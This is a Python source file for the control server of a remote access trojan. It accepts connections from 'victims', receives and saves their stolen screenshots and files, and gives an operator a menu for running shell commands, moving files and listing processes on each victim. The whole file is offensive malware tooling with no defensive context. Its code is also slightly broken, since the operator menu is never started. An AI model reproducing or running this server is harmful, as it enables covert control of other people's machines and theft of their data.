import socket
import threading
import json
import os
import base64
import subprocess
import ssl
from pathlib import Path

HOST = '0.0.0.0'          # listen on all interfaces
PORT = 4444                # default port
BUFFER_SIZE = 4096
ENCODING = 'utf-8'

# Dictionary to keep track of connected victims
victims = {}

def handle_client(conn, addr):
    """Thread to handle each victim."""
    print(f"[+] Victim connected: {addr}")
    victims[addr] = conn
    try:
        while True:
            data = conn.recv(BUFFER_SIZE)
            if not data:
                break
            try:
                msg = json.loads(data.decode(ENCODING))
                process_message(msg, addr)
            except json.JSONDecodeError:
                print(f"[{addr}] Raw: {data}")
    except Exception as e:
        print(f"[-] {addr} disconnected: {e}")
    finally:
        conn.close()
        victims.pop(addr, None)
        print(f"[*] {addr} removed")

def process_message(msg, addr):
    """Handle incoming messages from victims."""
    msg_type = msg.get('type')
    if msg_type == 'status':
        print(f"[{addr}] Status: {msg.get('data')}")
    elif msg_type == 'output':
        print(f"[{addr}] Output: {msg.get('data')}")
    elif msg_type == 'screenshot':
        save_screenshot(msg, addr)
    elif msg_type == 'file':
        save_file(msg, addr)
    elif msg_type == 'process':
        print(f"[{addr}] Processes:\n{msg.get('data')}")
    else:
        print(f"[{addr}] Unknown type: {msg_type}")

def save_screenshot(msg, addr):
    """Decode and save screenshot sent by victim."""
    img_data = base64.b64decode(msg.get('data'))
    filename = f"screenshot_{addr[0].replace('.', '_')}_{msg.get('timestamp')}.png"
    Path(filename).write_bytes(img_data)
    print(f"[{addr}] Screenshot saved as {filename}")

def save_file(msg, addr):
    """Decode and save file sent by victim."""
    file_path = msg.get('path')
    file_data = base64.b64decode(msg.get('data'))
    Path(file_path).write_bytes(file_data)
    print(f"[{addr}] File received: {file_path}")

def send_command(addr, cmd_type, payload):
    """Send a command to a specific victim."""
    conn = victims.get(addr)
    if not conn:
        print(f"[-] No connection to {addr}")
        return
    msg = {'type': cmd_type, 'data': payload}
    conn.sendall(json.dumps(msg).encode(ENCODING))

def command_loop():
    """CLI for sending commands to victims."""
    while True:
        print("\nConnected victims:")
        for i, addr in enumerate(victims.keys(), 1):
            print(f"  {i}. {addr}")
        choice = input("\nSelect victim number (or 'q' to quit): ")
        if choice.lower() == 'q':
            break
        try:
            idx = int(choice) - 1
            addr = list(victims.keys())[idx]
        except (ValueError, IndexError):
            print("Invalid selection")
            continue

        print("\nCommands:")
        print("  1. Execute shell command")
        print("  2. Upload file")
        print("  3. Download file")
        print("  4. Screenshot")
        print("  5. List processes")
        cmd = input("Choose command: ")

        if cmd == '1':
            shell_cmd = input("Shell command: ")
            send_command(addr, 'exec', shell_cmd)
        elif cmd == '2':
            local_path = input("Local file to upload: ")
            if not Path(local_path).is_file():
                print("File not found")
                continue
            content = Path(local_path).read_bytes()
            payload = {
                'path': input("Remote destination path: "),
                'data': base64.b64encode(content).decode(ENCODING)
            }
            send_command(addr, 'upload', payload)
        elif cmd == '3':
            remote_path = input("Remote file to download: ")
            send_command(addr, 'download', remote_path)
        elif cmd == '4':
            send_command(addr, 'screenshot', {})
        elif cmd == '5':
            send_command(addr, 'process', {})
        else:
            print("Unknown command")

def start_server():
    """Start the admin server and accept victims."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((HOST, PORT))
    sock.listen(5)
    print(f"[*] Admin listening on {HOST}:{PORT}")
    while True:
        conn, addr = sock.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    try:
        start_server()
    except KeyboardInterrupt:
        print("\n[*] Shutting down")
        for conn in victims.values():
            conn.close()
        exit(0)